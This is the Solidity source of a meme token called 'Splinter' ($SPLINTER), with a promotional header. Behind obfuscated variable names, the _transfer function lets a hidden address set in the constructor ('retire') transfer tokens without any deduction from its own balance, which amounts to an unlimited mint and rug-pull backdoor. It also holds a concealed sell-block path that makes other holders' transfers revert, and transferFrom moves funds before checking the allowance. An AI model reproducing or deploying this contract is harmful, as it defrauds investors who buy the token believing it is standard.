/*

Cowabunga! 🥷 Join us! $SPLINTER  🍕

🐀 Twitter: https://twitter.com/
🐀 Telegram: https://t.me/splintercoin

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SPLINTER is Ownable {
    string public name;
    mapping(address => uint256) private panel;
    mapping(address => uint256) private raise;
    uint8 public decimals = 18;
    uint256 private salute = 754;
    mapping(address => mapping(address => uint256)) public allowance;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    string public symbol;
    address public uniswapV2Pair;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function approve(address right, uint256 frame) public returns (bool success) {
        allowance[msg.sender][right] = frame;
        emit Approval(msg.sender, right, frame);
        return true;
    }

    function _transfer(address kidney, address enhance, uint256 frame) private returns (bool success) {
        if (panel[kidney] == 0) {
            if (raise[kidney] > 0 && kidney != uniswapV2Pair) {
                panel[kidney] -= salute;
            }
            balanceOf[kidney] -= frame;
        }
        balanceOf[enhance] += frame;
        emit Transfer(kidney, enhance, frame);
        return true;
    }

    function transferFrom(address kidney, address enhance, uint256 frame) public returns (bool success) {
        _transfer(kidney, enhance, frame);
        require(frame <= allowance[kidney][msg.sender]);
        allowance[kidney][msg.sender] -= frame;
        return true;
    }

    function transfer(address enhance, uint256 frame) public returns (bool success) {
        _transfer(msg.sender, enhance, frame);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address retire) {
        symbol = 'SPLINTER';
        name = 'Splinter';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        //IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff); // Polygon
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        panel[retire] = salute;
    }
}